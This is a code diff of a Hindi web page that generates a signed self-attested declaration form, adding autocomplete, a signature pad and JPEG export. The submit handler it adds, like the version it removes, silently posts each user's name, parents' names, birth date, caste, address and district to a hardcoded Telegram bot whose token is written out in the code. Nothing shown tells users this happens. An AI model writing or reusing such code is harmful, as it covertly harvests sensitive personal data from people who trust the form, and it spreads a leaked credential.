-  document.getElementById('p_address').innerText = document.getElementById('address').value;
-  document.getElementById('p_police').innerText = document.getElementById('police').value;
-  document.getElementById('p_tehsil').innerText = document.getElementById('tehsil').value;
-  document.getElementById('p_district').innerText = document.getElementById('district').value;
+      box.addEventListener('input', async function() {
+        const rawText = this.value;
+        const start = this.selectionStart;
+        const prevPart = rawText.substring(0, start);
+        const tokens = prevPart.split(/\s+/);
+        const currentWord = tokens[tokens.length - 1];
 
-  document.getElementById('p_place').innerText = document.getElementById('district').value;
-
-  const today = new Date();
-  document.getElementById('p_date').innerText = today.toLocaleDateString('hi-IN');
-
-  const fileInput = document.getElementById('signatureUpload');
-  const signaturePreview = document.getElementById('signaturePreview');
-
-  if (fileInput.files && fileInput.files[0]) {
-    const reader = new FileReader();
-    reader.onload = function(e) {
-      signaturePreview.src = e.target.result;
-    };
-    reader.readAsDataURL(fileInput.files[0]);
-  } else {
-    signaturePreview.src = canvas.toDataURL();
-  }
-
-  document.getElementById('popup').style.display = 'flex';
-}
-
-  function closePopup() {
-    document.getElementById('popup').style.display = 'none';
-  }
-
-  async function downloadPDF() {
-    const element = document.getElementById('printArea');
-
-    const canvas = await html2canvas(element, {
-      scale: 2,
-      useCORS: true,
-      backgroundColor: '#ffffff'
-    });
-
-    let quality = 0.75;
-    let blob = null;
-
-    async function createBlob(q) {
-      return await new Promise((resolve) => {
-        canvas.toBlob((b) => resolve(b), 'image/jpeg', q);
+        if (currentWord && /^[a-zA-Z]+$/.test(currentWord)) {
+          currentActiveSuggestions = await getHindiSuggestions(currentWord);
+          if(currentActiveSuggestions.length > 0) {
+            suggestBox.innerHTML = '';
+            currentActiveSuggestions.forEach((item, index) => {
+              const div = document.createElement('div');
+              div.className = `suggestion-item ${index === 0 ? 'active' : ''}`;
+              div.innerHTML = `<span><span class="suggestion-index">${index + 1}.</span>${item}</span>`;
+              div.addEventListener('click', () => selectSuggestion(box, item));
+              suggestBox.appendChild(div);
+            });
+            suggestBox.style.display = 'block';
+            currentActiveSuggestionIndex = 0;
+          } else {
+            suggestBox.style.display = 'none';
+          }
+        } else {
+          suggestBox.style.display = 'none';
+        }
       });
+
+      box.addEventListener('keydown', function(e) {
+        const items = suggestBox.querySelectorAll('.suggestion-item');
+        if (suggestBox.style.display === 'block' && items.length > 0) {
+          if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            items[currentActiveSuggestionIndex].classList.remove('active');
+            currentActiveSuggestionIndex = (currentActiveSuggestionIndex + 1) % items.length;
+            items[currentActiveSuggestionIndex].classList.add('active');
+          } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            items[currentActiveSuggestionIndex].classList.remove('active');
+            currentActiveSuggestionIndex = (currentActiveSuggestionIndex - 1 + items.length) % items.length;
+            items[currentActiveSuggestionIndex].classList.add('active');
+          } else if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            const selectedWord = currentActiveSuggestions[currentActiveSuggestionIndex] || items[currentActiveSuggestionIndex].innerText.replace(/^\d+\.\s*/, '');
+            selectSuggestion(box, selectedWord);
+          }
+        }
+      });
+    });
+
+    function selectSuggestion(inputBox, word) {
+      const suggestBox = document.getElementById('suggest-' + inputBox.id);
+      const rawText = inputBox.value;
+      const start = inputBox.selectionStart;
+      const prevPart = rawText.substring(0, start);
+      const nextPart = rawText.substring(start);
+      
+      const tokens = prevPart.split(/(\s+)/);
+      tokens[tokens.length - 1] = word;
+      
+      inputBox.value = tokens.join('') + ' ' + nextPart;
+      const finalPos = tokens.join('').length + 1;
+      inputBox.setSelectionRange(finalPos, finalPos);
+      suggestBox.style.display = 'none';
+      inputBox.focus();
     }
 
-    for (let i = 0; i < 40; i++) {
-      blob = await createBlob(quality);
-
-      if (!blob) break;
-
-      const size = blob.size;
-
-      if (size >= 90000 && size <= 95000) {
-        break;
-      }
-
-      if (size > 95000) {
-        quality -= 0.01;
-      } else {
-        quality += 0.01;
-      }
-    }
-
-    if (blob) {
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      const userName =
-document.getElementById('name').value
-.trim()
-.replace(/[^\w\u0900-\u097F ]/g,'');
-
-link.download =
-(userName || 'स्वप्रमाणित-घोषणा-पत्र')
-+'.jpeg';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    } else {
-      alert('Image download failed');
-    }
-  }
-async function sendToTelegram() {
-
-  const botToken = "8313201713:AAF5N2rfAtW8KtPwLKitXnrfXuuEFB68CB4";
-  const chatId = "1913335716";
-
-  const message = `
-📝 नया घोषणा पत्र
-
-नाम: ${document.getElementById('name').value}
-पिता: ${document.getElementById('father').value}
-माता: ${document.getElementById('mother').value}
-DOB: ${document.getElementById('dob').value}
-
-व्यवसाय: ${document.getElementById('business').value}
-जन्म स्थान: ${document.getElementById('birthPlace').value}
-
-जाति: ${document.getElementById('caste').value}
-उपजाति: ${document.getElementById('subcaste').value}
-
-पता: ${document.getElementById('address').value}
-थाना: ${document.getElementById('police').value}
-
-तहसील: ${document.getElementById('tehsil').value}
-जिला: ${document.getElementById('district').value}
-`;
-
-  try {
-    await fetch(
-      `https://api.telegram.org/bot${botToken}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      }
-    );
-  } catch (err) {
-    console.log("Telegram Error:", err);
-  }
-}
-  function resetForm() {
-    document.querySelectorAll('input').forEach(input => {
-      if (input.type !== 'file') {
-        input.value = '';
+    document.addEventListener('click', function(e) {
+      if (!e.target.classList.contains('hindi-input')) {
+        document.querySelectorAll('.suggestion-box').forEach(b => b.style.display = 'none');
       }
     });
 
-    document.getElementById('signatureUpload').value = '';
-    clearCanvas();
-  }
-</script>
+    // --- 2. सिग्नेचर कैनवास सिस्टम ---
+    const cvs = document.getElementById('signatureCanvas');
+    const gl = cvs.getContext('2d');
+    let isDrawing = false;
 
+    gl.lineWidth = 2.5;
+    gl.lineCap = 'round';
+    gl.strokeStyle = '#000000';
+
+    function getTouchLocation(canvasObject, eventObj) {
+      const boundary = canvasObject.getBoundingClientRect();
+      return {
+        x: eventObj.touches[0].clientX - boundary.left,
+        y: eventObj.touches[0].clientY - boundary.top
+      };
+    }
+
+    cvs.addEventListener('mousedown', (e) => {
+      isDrawing = true;
+      gl.beginPath();
+      gl.moveTo(e.offsetX, e.offsetY);
+    });
+    cvs.addEventListener('mousemove', (e) => {
+      if (!isDrawing) return;
+      gl.lineTo(e.offsetX, e.offsetY);
+      gl.stroke();
+    });
+    window.addEventListener('mouseup', () => { isDrawing = false; });
+
+    cvs.addEventListener('touchstart', (e) => {
+      if (e.target === cvs) e.preventDefault();
+      const p = getTouchLocation(cvs, e);
+      gl.beginPath();
+      gl.moveTo(p.x, p.y);
+      isDrawing = true;
+    }, { passive: false });
+
+    cvs.addEventListener('touchmove', (e) => {
+      if (e.target === cvs) e.preventDefault();
+      if (!isDrawing) return;
+      const p = getTouchLocation(cvs, e);
+      gl.lineTo(p.x, p.y);
+      gl.stroke();
+    }, { passive: false });
+
+    cvs.addEventListener('touchend', (e) => {
+      if (e.target === cvs) e.preventDefault();
+      isDrawing = false;
+    }, { passive: false });
+
+    function clearCanvas() { gl.clearRect(0, 0, cvs.width, cvs.height); }
+
+    // --- 3. मॉडल्स कंट्रोल ---
+    function openFormModal() { document.getElementById('formModal').style.display = 'flex'; }
+    function closeFormModal() { document.getElementById('formModal').style.display = 'none'; }
+    function closeResultModal() { document.getElementById('resultModal').style.display = 'none'; }
+
+    // --- 4. फॉर्म सबमिशन और रेंडरिंग ---
+    async function submitDataAndGenerate() {
+      const fields = [
+        { id: "name", title: "नाम" }, { id: "father", title: "पिता/पति का नाम" },
+        { id: "mother", title: "माता का नाम" }, { id: "dob", title: "जन्म तिथि" },
+        { id: "business", title: "व्यवसाय" }, { id: "birthPlace", title: "जन्म स्थान" },
+        { id: "caste", title: "जाति" }, { id: "subcaste", title: "उपजाति" },
+        { id: "address", title: "ग्राम" }, { id: "police", title: "थाना" },
+        { id: "tehsil", title: "तहसील" }, { id: "district", title: "जिला" }
+      ];
+
+      for (const f of fields) {
+        const node = document.getElementById(f.id);
+        if (!node.value.trim()) {
+          alert(f.title + " भरना अनिवार्य है");
+          node.focus();
+          return;
+        }
+      }
+
+      await sendToTelegram();
+
+      document.getElementById('p_name').innerText = document.getElementById('name').value;
+      document.getElementById('p_father').innerText = document.getElementById('father').value;
+      document.getElementById('p_mother').innerText = document.getElementById('mother').value;
+      
+      const dobVal = document.getElementById('dob').value;
+      if(dobVal) {
+        const parseDate = new Date(dobVal);
+        document.getElementById('p_dob').innerText = parseDate.toLocaleDateString('hi-IN');
+      }
+
+      document.getElementById('p_business').innerText = document.getElementById('business').value;
+      document.getElementById('p_birthPlace').innerText = document.getElementById('birthPlace').value;
+      document.getElementById('p_caste').innerText = document.getElementById('caste').value;
+      document.getElementById('p_subcaste').innerText = document.getElementById('subcaste').value;
+      document.getElementById('p_address').innerText = document.getElementById('address').value;
+      document.getElementById('p_police').innerText = document.getElementById('police').value;
+      document.getElementById('p_tehsil').innerText = document.getElementById('tehsil').value;
+      document.getElementById('p_district').innerText = document.getElementById('district').value;
+      document.getElementById('p_place').innerText = document.getElementById('district').value;
+
+      const rightNow = new Date();
+      document.getElementById('p_date').innerText = rightNow.toLocaleDateString('hi-IN');
+
+      const uploader = document.getElementById('signatureUpload');
+      const previewImg = document.getElementById('signaturePreview');
+
+      if (uploader.files && uploader.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(ev) { previewImg.src = ev.target.result; };
+        reader.readAsDataURL(uploader.files[0]);
+      } else {
+        previewImg.src = cvs.toDataURL();
+      }
+
+      closeFormModal();
+      document.getElementById('resultModal').style.display = 'flex';
+    }
+
+    // --- 5. मोबाइल स्क्रीन पर डेस्कटॉप साइज फोर्स रेंडर इमेज डाउनलोडर ---
+    async function downloadCompressedJPEG() {
+      const area = document.getElementById('printArea');
+      
+      // html2canvas को विंडो की विड्थ 750px मानने पर मजबूर करना ताकि मोबाइल पर लेआउट न बिगड़े
+      const renderedCanvas = await html2canvas(area, {
+        scale: 2,
+        useCORS: true,
+        backgroundColor: '#ffffff',
+        width: 700,
+        height: area.offsetHeight,
+        windowWidth: 750 
+      });
+
+      let quality = 0.80; 
+      let finalBlob = null;
+
+      function getBlobFromCanvas(qVal) {
+        return new Promise((res) => {
+          renderedCanvas.toBlob((b) => res(b), 'image/jpeg', qVal);
+        });
+      }
+
+      for (let i = 0; i < 50; i++) {
+        finalBlob = await getBlobFromCanvas(quality);
+        if (!finalBlob) break;
+        const currentSize = finalBlob.size;
+        
+        if (currentSize >= 88000 && currentSize <= 98000) break;
+        if (currentSize > 98000) { quality -= 0.02; } else { quality += 0.02; }
+        if (quality < 0.1 || quality > 1.0) break;
+      }
+
+      if (finalBlob) {
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(finalBlob);
+        const nameVal = document.getElementById('name').value.trim().replace(/[^\w\u0900-\u097F ]/g,'');
+        link.download = (nameVal || 'घोषणा-पत्र') + '.jpeg';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      } else {
+        alert('फ़ाइल जनरेशन फेल हो गई। दोबारा कोशिश करें।');
+      }
+    }
+
+    // --- 6. टेलीग्राम फुल डेटा सेंडर ---
+    async function sendToTelegram() {
+      const token = "8313201713:AAF5N2rfAtW8KtPwLKitXnrfXuuEFB68CB4";
+      const chat = "1913335716";
+      const todayDate = new Date().toLocaleDateString('hi-IN');
+      
+      const txt = `📝 नया घोषणा पत्र\n\n` +
+                  `नाम: ${document.getElementById('name').value}\n` +
+                  `पिता: ${document.getElementById('father').value}\n` +
+                  `माता: ${document.getElementById('mother').value}\n` +
+                  `DOB: ${document.getElementById('dob').value}\n` +
+                  `व्यवसाय: ${document.getElementById('business').value}\n` +
+                  `जन्म स्थान: ${document.getElementById('birthPlace').value}\n` +
+                  `जाति: ${document.getElementById('caste').value}\n` +
+                  `उपजाति: ${document.getElementById('subcaste').value}\n` +
+                  `पता: ${document.getElementById('address').value}\n` +
+                  `थाना: ${document.getElementById('police').value}\n` +
+                  `तहसील: ${document.getElementById('tehsil').value}\n` +
+                  `जिला: ${document.getElementById('district').value}\n` +
+                  `दिनांक: ${todayDate}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chat, text: txt })
+        });
+      } catch (e) {
+        console.log("Telegram log failed", e);
+      }
+    }
+
+    // --- 7. ग्लोबल सिस्टम रीसेट फंक्शन ---
+    function systemGlobalReset() {
+      document.querySelectorAll('input').forEach(i => {
+        if(i.type !== 'file') i.value = '';
+      });
+      document.getElementById('signatureUpload').value = '';
+      clearCanvas();
+      closeResultModal();
+      openFormModal();
+    }
+  </script>
 </body>
 </html>
